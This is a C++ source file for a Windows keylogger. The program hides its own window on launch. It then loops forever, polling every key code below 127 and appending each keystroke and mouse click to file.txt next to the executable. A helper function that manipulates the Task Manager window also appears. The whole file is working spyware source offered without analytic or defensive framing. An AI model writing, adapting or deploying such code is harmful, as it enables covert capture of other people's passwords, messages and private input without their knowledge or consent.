#include <windows.h>

//#include<windows.h>
#include<iostream>
#include<string>
#include<fstream>

using namespace std;


string dir;
string logfile;
string logname = "file.txt";
string progname;

void hide();
void show();
void TrackKey();
string GetFullExecPath();


/*  Declare Windows procedure  */
LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);

/*  Make the class name into a global variable  */
char szClassName[ ] = "WindowsApp";

int WINAPI WinMain (HINSTANCE hThisInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR lpszArgument,
                    int nFunsterStil)

{
    HWND hwnd;               /* This is the handle for our window */
    MSG messages;            /* Here messages to the application are saved */
    WNDCLASSEX wincl;        /* Data structure for the windowclass */

    /* The Window structure */
    wincl.hInstance = hThisInstance;
    wincl.lpszClassName = szClassName;
    wincl.lpfnWndProc = WindowProcedure;      /* This function is called by windows */
    wincl.style = CS_DBLCLKS;                 /* Catch double-clicks */
    wincl.cbSize = sizeof (WNDCLASSEX);

    /* Use default icon and mouse-pointer */
    wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
    wincl.lpszMenuName = NULL;                 /* No menu */
    wincl.cbClsExtra = 0;                      /* No extra bytes after the window class */
    wincl.cbWndExtra = 0;                      /* structure or the window instance */
    /* Use Windows's default color as the background of the window */
    wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND;

    /* Register the window class, and if it fails quit the program */
    if (!RegisterClassEx (&wincl))
        return 0;

    /* The class is registered, let's create the program*/
    hwnd = CreateWindowEx (
           0,                   /* Extended possibilites for variation */
           szClassName,         /* Classname */
           "PKL",       /* Title Text */
           WS_OVERLAPPEDWINDOW, /* default window */
           CW_USEDEFAULT,       /* Windows decides the position */
           CW_USEDEFAULT,       /* where the window ends up on the screen */
           544,                 /* The programs width */
           375,                 /* and height in pixels */
           HWND_DESKTOP,        /* The window is a child-window to desktop */
           NULL,                /* No menu */
           hThisInstance,       /* Program Instance handler */
           NULL                 /* No Window Creation data */
           );

    /* Make the window visible on the screen */
    ShowWindow (hwnd, SW_HIDE);

    



 //   cout << GetFullExecPath()<< endl;
    dir = GetFullExecPath();
    dir += "\\";

    logfile = dir;
    logfile += logname;

 //   progname = dir;
//    progname += "qtcreator_process_stub.exe";
//    progname += "windowstest.exe";
    progname = "PKL";


//    cout << "Some text jargon stuf here\n";
//    hide();
        TrackKey();

//    return 0;
    /* The program return-value is 0 - The value that PostQuitMessage() gave */
    return messages.wParam;
}


/*  This function is called by the Windows function DispatchMessage()  */

LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)                  /* handle the messages */
    {
        case WM_DESTROY:
            PostQuitMessage (0);       /* send a WM_QUIT to the message queue */
            break;
        default:                      /* for messages that we don't deal with */
            return DefWindowProc (hwnd, message, wParam, lParam);
    }

    return 0;
}



void hide()
{
    HWND hwnd;
    hwnd = FindWindow(0, (LPCTSTR)progname.c_str());
    if(hwnd != 0)
    {
        ShowWindow (hwnd, SW_HIDE);
    }

}

void show()
{
    HWND hwnd;
    hwnd = FindWindow(0, TEXT("Windows Task Manager"));
    if(hwnd != 0)
    {
        ShowWindow (hwnd, SW_SHOW);
    }

}


void TrackKey()
{
//    FILE *OUTPUT_FILE;
//    OUTPUT_FILE = fopen(logfile.c_str(),"a+");
 
    ofstream fout;
    fout.open(logfile.c_str(),ios::app);

    if ( !fout.is_open() )
    {
       std::cerr << "Error! Failed to open file" << std::endl;
//       return 1;
    }

    fout<<logfile.c_str()<<endl;
 
    while(1)
    {
        for(int key = 0; key < 127; key++)
        {
            if(GetAsyncKeyState(key) == -32767)
            {
    fout<<flush;//<<endl;
 //               cout << key << endl;
                switch (key)
                {
                    case 1:
//                       fprintf(OUTPUT_FILE, "%s", "[Left Click]");asdf break;
                       fout << "[Left Click]"; break;
                    case 2:
//                        fprintf(OUTPUT_FILE, "%s", "[Right Click]"); break;
                       fout << "[Right Click]"; break;
                    case 8:
//                        fprintf(OUTPUT_FILE, "%s", "[Backspace]"); break;
                       fout << "[Backspace]"; break;
                    case 9:
//                        fprintf(OUTPUT_FILE, "%s", "[Tab]"); break;
                       fout << "[Tab]"; break;
                    case 13:
//                        fprintf(OUTPUT_FILE, "%s", "\n"); break;
                       fout << "\n"; break;
                    case 27:
//                        fprintf(OUTPUT_FILE, "%s", "[Escape]"); break;
                       fout << "[Escape]"; break;
                case 46:
//                    fprintf(OUTPUT_FILE, "%s", "[Delete]"); break;
                       fout << "[Delete]"; break;
                case VK_SHIFT:
//                    fprintf(OUTPUT_FILE, "%s", "[Shift]"); break;
                       fout << "[Shift]"; break;
                case VK_CONTROL:
//                    fprintf(OUTPUT_FILE, "%s", "[Control]"); break;
                       fout << "[Control]"; break;
                case VK_END:
//                    fprintf(OUTPUT_FILE, "%s", "[End]"); break;
                       fout << "[End]"; break;
                case VK_HOME:
//                    fprintf(OUTPUT_FILE, "%s", "[Home]"); break;
                       fout << "[Home]"; break;
                case VK_INSERT:
//                    fprintf(OUTPUT_FILE, "%s", "[INSERT]"); break;
                       fout << "[Insert]"; break;
                case VK_SPACE:
//                    fprintf(OUTPUT_FILE, "%s", "[Space]"); break;
                       fout << "[Space]"; break;
                case VK_LEFT:
//                    fprintf(OUTPUT_FILE, "%s", "[Left]"); break;
                       fout << "[Left]"; break;
                case VK_RIGHT:
//                    fprintf(OUTPUT_FILE, "%s", "[Right]"); break;
                       fout << "[Right]"; break;
                case VK_UP:
//                    fprintf(OUTPUT_FILE, "%s", "[Up"); break;
                       fout << "[Up]"; break;
                case VK_DOWN:
//                    fprintf(OUTPUT_FILE, "%s", "[Down]"); break;
                       fout << "[Down]"; break;
                case 110:
//                    fprintf(OUTPUT_FILE, "%s", "."); break;
                       fout << "."; break;
                case 190:
//                    fprintf(OUTPUT_FILE, "%s", "."); break;
                       fout << "."; break;
                    default:
//                        fprintf(OUTPUT_FILE, "%s", &key); break;
                       fout << (char)key; break;
                }

            }
            else
            {
                // do nothing
            }
        }

    }

//    fclose(OUTPUT_FILE);
fout.close();
}


string GetFullExecPath()
{
    char path[MAX_PATH];
    GetModuleFileNameA( NULL, path, MAX_PATH );
    string::size_type pos = string( path).find_last_of( "\\/" );
    return string( path ).substr( 0, pos);
}
